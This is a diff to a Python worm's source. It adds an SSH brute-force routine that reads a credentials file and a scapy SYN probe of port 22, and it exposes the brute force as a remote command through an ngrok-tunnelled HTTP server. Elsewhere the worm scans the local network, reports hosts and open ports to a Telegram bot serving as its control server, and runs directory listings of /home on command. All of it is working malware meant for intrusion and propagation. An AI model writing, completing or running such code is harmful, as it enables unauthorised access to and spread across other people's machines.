@@ -13,9 +13,6 @@ from scapy.all import *
 from pyngrok import ngrok
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-
-import time as t
-
 """
 PROPAGATION
 """
@@ -36,17 +33,32 @@ def propagate(host,port,username,password):
 SSH BRUTE FORCE
 """
 def connection_established(host,port,username,password):
-	ssh = paramiko.SSHClient()
-	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	try:
-		ssh.connect(host,port,username,password,banner_timeout=2)
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		ssh.connect(host,port,username,password)
 		ssh.close()
 		return True
 	except:
-		ssh.close()
+		if ssh:
+			ssh.close()
 		return False
+		
+def check_port_22(target_ip,port):
+	is_open = False		
+	
+	tcp = TCP(sport=3333,dport=port,flags="S")
+	ip = IP(dst=target_ip)
+	SYN = ip/tcp
+	SYNACK = sr1(SYN,verbose=0,timeout=1,retry=2)
+	if SYNACK and 'R' not in SYNACK[TCP].flags:
+		is_open = True
+		
+	return is_open
 
 def ssh_brute_force(host,port):
+
+	if not check_port_22(host,port): return "Given host doesn't exits or has port 22 closed"
 
 	creds_file = open("credentials.txt","r")
 	cred_list = creds_file.read().split("\n")
@@ -91,6 +103,7 @@ def port_scan(network):
 	pool = mp.Pool()
 	results = pool.map(scan,targets)
 	results = [elem for elem in results if elem[1]]
+	
 	return results
 	
 	
@@ -145,6 +158,7 @@ def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,code,devices_o
 		for elem in devices_open_ports:
 			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"
 		
+	print("> sending feedback to control server...")
 	post_req = requests.post("https://api.telegram.org/bot"+token+ \
 				  "/sendMessage",data={"chat_id":chat_id,"text":status})
 				  
@@ -170,15 +184,7 @@ HTTP SERVER FUNCTIONALITIES
 def delete():
 	# TODO: KILL python process and delete all worm files
 	return "deleted"
-	
-def ssh_brute_force():
-	# TODO
-	return "ssh_brute_force"
-	
-def spread():
-	# TODO
-	return "spreaded"
-	
+		
 def ls(path):
 	process = subprocess.run(["ls",path],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 	
@@ -191,17 +197,18 @@ def tree_home():
 	process = subprocess.run(["tree","/home"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 	return process.stdout
 	
-def execute_command(command,ls_path=None,ssh_bf_host=None):
+def execute_command(command,ls_path=None,ssh_bf_target=None):
 	if command == "ls":
 		return ls(ls_path)
 	elif command == "delete":
 		return delete()
 		
 	elif command == "ssh_brute_force":
-		return ssh_brute_force()
+		return str(ssh_brute_force(ssh_bf_target,22))
 	
 	elif command == "spread":
-		return spread()
+		return "propagate"
+		
 	elif command == "tree_home":
 		return tree_home()
 	
@@ -224,6 +231,10 @@ class request_handler(BaseHTTPRequestHandler):
 			if len(command_args) == 2 and command == "ls":
 				path = command_args[1]
 				output = execute_command(command,ls_path=path)
+				
+			elif len(command_args) == 2 and command == "ssh_brute_force":
+				target = command_args[1]
+				output = execute_command(command,ssh_bf_target=target)
 			else:
 				output = execute_command(command)
 			"""
@@ -294,6 +305,8 @@ def run_server(host,port,tel_token,chat_id,ssh_enabled=False):
 	"""
 	STARTING WEB SERVER
 	"""
+	print("> starting http server. Waiting for commands...")
+	
 	if ssh_enabled: 
 		webserver = HTTPServer((host,port),request_handler)
 	else:
@@ -334,9 +347,7 @@ if __name__ == "__main__":
 	network = discover_network(subnet)
 	if not network:
 		print("... No other active devices in the network")
-		print("> sending feedback to control server...")
 		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,1)
-		print("> starting http server. Waiting for commands...")
 		run_server("localhost",2525,config["http_token"],config["chat_id"])
 		sys.exit()
 	
@@ -346,9 +357,7 @@ if __name__ == "__main__":
 	devices_open_ports = port_scan(network)
 	if not devices_open_ports:
 		print("... All devices on the network have well known ports closed")
-		print("> sending feedback to control server...")
 		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,2)
-		print("> starting http server. Waiting for commands...")
 		run_server("localhost",2525,config["http_token"],config["chat_id"])
 		sys.exit()
 	
@@ -356,16 +365,12 @@ if __name__ == "__main__":
 	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
 	if not ssh_targets:
 		print("... No devices with port 22 opened")
-		print("> sending feedback to control server...")
 		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,3,devices_open_ports=devices_open_ports)
-		print("> starting http server. Waiting for commands...")
 		run_server("localhost",2525,config["http_token"],config["chat_id"])
 		sys.exit()
 	
 	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
-	print("> sending feedback to control server...")
 	send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,4,devices_open_ports=devices_open_ports)
 	
 	### RUNNING HTTP WEB SERVER ###
-	print("> starting http server. Waiting for commands...")
 	run_server("localhost",2525,config["http_token"],config["chat_id"],True)
